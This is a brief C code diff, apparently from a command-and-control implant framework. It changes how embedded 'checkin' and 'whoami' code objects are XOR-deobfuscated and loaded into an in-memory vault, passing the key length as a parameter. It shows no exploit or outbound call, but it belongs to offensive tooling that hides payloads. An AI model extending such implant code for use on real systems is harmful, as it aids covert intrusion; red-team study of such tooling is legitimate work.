@@ -36,7 +36,7 @@ char *deobfuscate_pico(_EMBEDDED_PICO *pico, char *key, int keylen) {
 	return output;
 }
 
-BuiltinPicos load_builtin_picos(DataVault *vault, char *key) {
+BuiltinPicos load_builtin_picos(DataVault *vault, char *key, int keylen) {
 	BuiltinPicos picos = { 0 };
 
 	// Load default names for the built-in PICOs.
@@ -48,8 +48,8 @@ BuiltinPicos load_builtin_picos(DataVault *vault, char *key) {
 	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
 	
 	// Deobfuscate PICOs.
-	char *checkin_buf = deobfuscate_pico(checkin, key, XORKEY_LEN);
-	char *whoami_buf = deobfuscate_pico(whoami, key, XORKEY_LEN);
+	char *checkin_buf = deobfuscate_pico(checkin, key, keylen);
+	char *whoami_buf = deobfuscate_pico(whoami, key, keylen);
 	
 	// Copy deobfuscated PICOs into the in-memory vault.
 	add_to_vault(vault, picos.checkin, checkin_buf, checkin->length);
